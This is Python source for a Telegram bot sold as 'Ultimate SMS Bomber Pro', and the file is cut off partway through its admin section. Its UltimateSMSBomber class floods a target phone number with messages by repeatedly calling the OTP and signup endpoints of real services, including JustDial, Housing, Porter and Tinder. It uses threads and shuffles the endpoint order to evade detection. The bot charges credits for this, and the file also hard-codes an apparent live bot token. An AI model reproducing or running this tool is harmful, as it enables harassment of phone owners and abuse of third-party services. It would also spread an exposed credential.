import logging
import sqlite3
import requests
import threading
import asyncio
import time
import random
from telegram import (
    Update, 
    InlineKeyboardButton, 
    InlineKeyboardMarkup
)
from telegram.ext import (
    Application, 
    CommandHandler, 
    MessageHandler, 
    filters, 
    ContextTypes,
    CallbackQueryHandler,
    ConversationHandler
)

# Bot configuration
BOT_TOKEN = "8386048836:AAHwJuBXUudmwYqiybtYFgPJX1YYIA3D0AI"
ADMIN_ID = 6847499628

# Force subscription channel
CHANNEL_USERNAME = "@EscrowMoon"
CHANNEL_ID = -1002699957030

# Payment QR code - Direct image URL
PAYMENT_QR_URL = "https://i.postimg.cc/qBXmX2pP/IMG-20251115-190606-343.jpg"

# Credit packages
CREDIT_PACKAGES = {
    "100": {"credits": 100, "price": 10},
    "250": {"credits": 250, "price": 20},
    "500": {"credits": 500, "price": 40},
    "1000": {"credits": 1000, "price": 80},
    "2000": {"credits": 2000, "price": 150}
}

# Bombing options
BOMB_OPTIONS = {
    "10": 10,
    "50": 50, 
    "100": 100,
    "200": 200,
    "300": 300,
    "400": 400,
    "500": 500
}

# Conversation states
WAITING_UTR, WAITING_PHONE = range(2)

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Database setup
def init_db():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            first_name TEXT,
            credits INTEGER DEFAULT 30,
            referrals INTEGER DEFAULT 0,
            referred_by INTEGER DEFAULT NULL,
            is_premium INTEGER DEFAULT 0,
            is_admin INTEGER DEFAULT 0,
            join_date DATETIME DEFAULT CURRENT_TIMESTAMP,
            is_verified INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            package TEXT,
            amount REAL,
            credits INTEGER,
            utr TEXT,
            status TEXT DEFAULT 'pending',
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Add admin user
    cursor.execute('INSERT OR IGNORE INTO users (user_id, username, first_name, credits, is_admin, is_verified) VALUES (?, ?, ?, ?, ?, ?)',
                  (ADMIN_ID, "Owner", "Admin", 999999, 1, 1))
    
    conn.commit()
    conn.close()

def get_user(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
    user = cursor.fetchone()
    conn.close()
    return user

def update_user(user_id, username, first_name):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, username, first_name, credits, referrals, referred_by, is_premium, is_admin, is_verified, is_banned)
        VALUES (?, ?, ?, COALESCE((SELECT credits FROM users WHERE user_id = ?), 30), 
                COALESCE((SELECT referrals FROM users WHERE user_id = ?), 0),
                COALESCE((SELECT referred_by FROM users WHERE user_id = ?), NULL),
                COALESCE((SELECT is_premium FROM users WHERE user_id = ?), 0),
                COALESCE((SELECT is_admin FROM users WHERE user_id = ?), 0),
                COALESCE((SELECT is_verified FROM users WHERE user_id = ?), 0),
                COALESCE((SELECT is_banned FROM users WHERE user_id = ?), 0))
    ''', (user_id, username, first_name, user_id, user_id, user_id, user_id, user_id, user_id, user_id))
    conn.commit()
    conn.close()

def mark_verified(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET is_verified = 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def update_credits(user_id, credits):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (credits, user_id))
    conn.commit()
    conn.close()

def add_referral(referrer_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET referrals = referrals + 1, credits = credits + 25 WHERE user_id = ?', (referrer_id,))
    conn.commit()
    conn.close()

def add_payment(user_id, package, amount, credits, utr):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('INSERT INTO payments (user_id, package, amount, credits, utr) VALUES (?, ?, ?, ?, ?)',
                  (user_id, package, amount, credits, utr))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM users')
    users = cursor.fetchall()
    conn.close()
    return users

def get_total_users():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT COUNT(*) FROM users')
    count = cursor.fetchone()[0]
    conn.close()
    return count

def get_total_credits():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT SUM(credits) FROM users')
    total = cursor.fetchone()[0] or 0
    conn.close()
    return total

def get_total_referrals():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT SUM(referrals) FROM users')
    total = cursor.fetchone()[0] or 0
    conn.close()
    return total

def is_admin(user_id):
    user = get_user(user_id)
    return user and user[7] == 1

def is_verified(user_id):
    user = get_user(user_id)
    return user and user[9] == 1

def is_banned(user_id):
    user = get_user(user_id)
    return user and user[10] == 1

def add_admin(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET is_admin = 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def remove_admin(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET is_admin = 0 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def ban_user(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def unban_user(user_id):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def get_pending_payments():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM payments WHERE status = "pending"')
    payments = cursor.fetchall()
    conn.close()
    return payments

def update_payment_status(payment_id, status):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE payments SET status = ? WHERE id = ?', (status, payment_id))
    conn.commit()
    conn.close()

def get_all_admins():
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    cursor.execute('SELECT user_id, username, first_name FROM users WHERE is_admin = 1')
    admins = cursor.fetchall()
    conn.close()
    return admins

# Your SMS Bomber Class (Integrated)
class UltimateSMSBomber:
    def __init__(self, phone_number, country_code="91", message_count=10):
        self.phone = phone_number
        self.country_code = country_code
        self.message_count = message_count
        self.user_agent = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
        self.active = True
        self.success_count = 0
        self.fail_count = 0
        self.sent_count = 0
        self.api_stats = {}
        self.lock = threading.Lock()
        self.apis = self._load_all_apis()
    
    def _load_all_apis(self):
        """Load all APIs from your provided code"""
        apis = []
        
        # Indian APIs (country code 91)
        indian_apis = [
            {
                "name": "ConfirmTKT",
                "method": "GET",
                "url": "https://securedapi.confirmtkt.com/api/platform/register",
                "params": {"newOtp": "true", "mobileNumber": self.phone},
                "identifier": "false"
            },
            {
                "name": "JustDial",
                "method": "GET",
                "url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php",
                "params": {"mobile": self.phone},
                "identifier": "sent"
            },
            {
                "name": "Allen Solly",
                "method": "POST",
                "url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
                "data": {"mobileoremail": self.phone, "name": "markluther"},
                "identifier": "true"
            },
            {
                "name": "Frotels",
                "method": "POST",
                "url": "https://www.frotels.com/appsendsms.php",
                "data": {"mobno": self.phone},
                "identifier": "sent"
            },
            {
                "name": "GAPOON",
                "method": "POST",
                "url": "https://www.gapoon.com/userSignup",
                "data": {
                    "mobile": self.phone,
                    "email": "noreply@gmail.com",
                    "name": "LexLuthor"
                },
                "identifier": "1"
            },
            {
                "name": "Housing",
                "method": "POST",
                "url": "https://login.housing.com/api/v2/send-otp",
                "data": {"phone": self.phone},
                "identifier": "Sent"
            },
            {
                "name": "Porter",
                "method": "POST",
                "url": "https://porter.in/restservice/send_app_link_sms",
                "data": {"phone": self.phone, "referrer_string": "", "brand": "porter"},
                "identifier": "true"
            },
            {
                "name": "Cityflo",
                "method": "POST",
                "url": "https://cityflo.com/website-app-download-link-sms/",
                "data": {"mobile_number": self.phone},
                "identifier": "sent"
            }
        ]
        
        # Multi-country APIs
        multi_country_apis = [
            {
                "name": "Qlean",
                "method": "POST",
                "url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
                "data": {"phone": f"{self.country_code}{self.phone}"},
                "identifier": "request_id"
            },
            {
                "name": "Mail.ru",
                "method": "POST",
                "url": "https://cloud.mail.ru/api/v2/notify/applink",
                "data": {
                    "phone": f"+{self.country_code}{self.phone}",
                    "api": "2",
                    "email": "email",
                    "x-email": "x-email"
                },
                "identifier": "200"
            },
            {
                "name": "Tinder",
                "method": "POST",
                "url": "https://api.gotinder.com/v2/auth/sms/send",
                "data": {"phone_number": f"{self.country_code}{self.phone}"},
                "params": {"auth_type": "sms", "locale": "ru"},
                "identifier": "200"
            }
        ]
        
        # Combine all APIs
        all_apis = indian_apis + multi_country_apis
        
        # Add country code to each API
        for api in all_apis:
            api["cc"] = self.country_code
            
        return all_apis
    
    def _send_request(self, api):
        try:
            # Replace placeholders
            url = api["url"].replace("{target}", self.phone).replace("{cc}", self.country_code)
            
            # Prepare request data
            request_data = {}
            if "data" in api:
                request_data = {k: v.replace("{target}", self.phone).replace("{cc}", self.country_code) 
                              if isinstance(v, str) else v 
                              for k, v in api["data"].items()}
            
            headers = {
                "User-Agent": self.user_agent,
                **api.get("headers", {})
            }
            
            cookies = api.get("cookies", {})
            
            # Send request
            if api["method"] == "POST":
                if "json" in api:
                    response = requests.post(url, json=api["json"], headers=headers, cookies=cookies, timeout=10)
                else:
                    response = requests.post(url, data=request_data, headers=headers, cookies=cookies, timeout=10)
            else:
                params = request_data if "data" in api else api.get("params", {})
                response = requests.get(url, params=params, headers=headers, cookies=cookies, timeout=10)
            
            # Check success
            identifier = api.get("identifier", "")
            success = False
            if identifier:
                if identifier.isdigit():
                    success = str(response.status_code) == identifier
                else:
                    success = identifier.lower() in str(response.text).lower()
            else:
                success = response.status_code == 200
            
            # Update stats
            with self.lock:
                if success:
                    self.success_count += 1
                    self.api_stats[api["name"]] = self.api_stats.get(api["name"], 0) + 1
                else:
                    self.fail_count += 1
                self.sent_count += 1
            
            return success
            
        except Exception as e:
            with self.lock:
                self.fail_count += 1
                self.sent_count += 1
            return False
    
    def start_bombing(self):
        """Start multi-threaded bombing with limited messages"""
        self.active = True
        self.sent_count = 0
        
        def bomb_worker():
            while self.active and self.sent_count < self.message_count:
                # Shuffle APIs to avoid pattern detection
                random.shuffle(self.apis)
                
                for api in self.apis:
                    if not self.active or self.sent_count >= self.message_count:
                        break
                    
                    self._send_request(api)
                    time.sleep(0.5)  # Reduced delay for faster bombing
        
        thread = threading.Thread(target=bomb_worker)
        thread.daemon = True
        thread.start()
        
        return f"🚀 SMS bombing started on +{self.country_code}{self.phone}\n📨 Target: {self.message_count} messages"
    
    def stop_bombing(self):
        self.active = False
        return f"""
🛑 Bombing Stopped!

📊 Results:
✅ Success: {self.success_count}
❌ Failed: {self.fail_count}
📨 Sent: {self.sent_count}
🎯 Target: {self.message_count}
"""

    def get_progress(self):
        return {
            "success": self.success_count,
            "failed": self.fail_count,
            "sent": self.sent_count,
            "target": self.message_count,
            "active": self.active
        }

# Bot Functions
async def check_subscription(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if is_admin(user_id) or is_verified(user_id):
        return True
    
    try:
        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['left', 'kicked']:
            return False
        return True
    except Exception as e:
        logging.error(f"Subscription check error: {e}")
        return False

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    first_name = update.effective_user.first_name
    
    # Check if user is banned
    if is_banned(user_id):
        await update.message.reply_text("❌ You are banned from using this bot.")
        return
    
    update_user(user_id, username, first_name)
    
    referred_by = None
    if context.args:
        try:
            referred_by = int(context.args[0])
            if referred_by != user_id:
                user_data = get_user(user_id)
                if user_data and not user_data[5]:
                    add_referral(referred_by)
                    conn = sqlite3.connect('users.db')
                    cursor = conn.cursor()
                    cursor.execute('UPDATE users SET referred_by = ? WHERE user_id = ?', (referred_by, user_id))
                    conn.commit()
                    conn.close()
        except ValueError:
            pass
    
    if is_verified(user_id):
        await show_main_menu(update, context)
        return
    
    welcome_text = f"""
👋 **Welcome {first_name}!**

🤖 **Ultimate SMS Bomber Pro**

🔒 **To access this bot, you need to:**
1. Join our official channel
2. Click the verify button

✨ **Features you'll get:**
• 🚀 Advanced SMS Bombing
• 💳 Credit System  
• 👥 Referral Program
• 🔒 Secure & Fast

📢 **Channel:** {CHANNEL_USERNAME}
"""
    
    keyboard = [
        [InlineKeyboardButton("🌙 Team Moon", url=f"https://t.me/{CHANNEL_USERNAME[1:]}")],
        [InlineKeyboardButton("🔐 Verify", callback_data="verify_subscription")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.callback_query.edit_message_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

async def verify_subscription(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if await check_subscription(update, context):
        mark_verified(user_id)
        await query.edit_message_text("✅ Verification successful! Loading main menu...")
        await show_main_menu(update, context)
    else:
        await query.answer("❌ Please join the channel first! Click 'Team Moon' to join.", show_alert=True)

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    
    welcome_text = f"""
🎉 **Welcome {user[2]}!**

🤖 **Ultimate SMS Bomber Pro**

✨ **Available Features:**
• 🚀 Advanced SMS Bombing
• 💳 Credit System (1 Credit = 1 SMS)
• 👥 Referral Program
• 🔒 Secure & Fast

💎 **Your Credits:** {user[3]}
👥 **Your Referrals:** {user[4]}

Choose an option below:
"""
    
    keyboard = [
        [InlineKeyboardButton("👤 Account", callback_data="account"),
         InlineKeyboardButton("👥 Referral", callback_data="referral")],
        [InlineKeyboardButton("💳 Buy Credit", callback_data="buy_credit"),
         InlineKeyboardButton("🚀 Start Bombing", callback_data="bomb_menu")],
        [InlineKeyboardButton("📞 Contact Admin", url="https://t.me/HelpLuffyBot")]
    ]
    
    # Add admin panel button for admins
    if is_admin(user_id):
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await update.callback_query.edit_message_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
    else:
        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

# ==================== ADMIN COMMANDS ====================

async def admin_panel(update: Update, context: ContextT
